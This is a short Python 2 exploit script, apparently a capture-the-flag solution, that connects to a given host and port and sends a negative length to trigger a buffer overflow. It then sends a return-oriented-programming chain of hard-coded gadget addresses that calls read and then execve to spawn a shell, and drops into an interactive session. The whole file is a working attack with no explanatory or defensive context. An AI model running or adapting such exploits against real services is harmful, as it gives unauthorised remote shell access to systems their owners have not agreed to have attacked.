#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
# s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
print recvuntil("read? ")
s.send("-1\n")
recvuntil("data!\n")
raw_input()
data = ''
data += "A"*48
data +=  p32(0x0804841a) #clean eax
data +=  p32(0x080484d3)*3 #eax = 3 -> syscall read
data += p32(0x0804835d) #pop ebx
data += p32(0xffffffff) #to be popped to ebx
data += p32(0x080484d5) #set ebx = 0
data +=  p32(0x08048459) #clean edx
data += p32(0x080484d9)*7 #set edx=10
data += p32(0x0804849a)*70 #clean ecx
data += p32(0x080484d7)*2 #ecx=2
data += p32(0x0804849a)*8 #ecx = 512.0
data += p32(0x080484d7) #ecx=513
data += p32(0x0804849a)*3 #ecx = 4104
data += p32(0x080484d7) #ecx=4105
data += p32(0x0804849a)*2 #ecx = 16420
data += p32(0x080484d7) #ecx=16421
data += p32(0x0804849a)*7 #ecx = 2101888
data += p32(0x080484d7) #ecx=2101889
data += p32(0x0804849a)*6 #ecx = 134520896
data += p32(0x080484d0) #int 80
data +=  p32(0x08048459) #clean edx
data += p32(0x0804849a)*100 #reset ecx
data += p32(0x0804835d) #pop edx
data += p32(0x804a040) #ebx = 0x804a040
data += p32(0x080484d3)*4 #eax = 11
data += p32(0x080484d0) #int 80
data += '\n'
s.send(data)
interactive()
s.close()
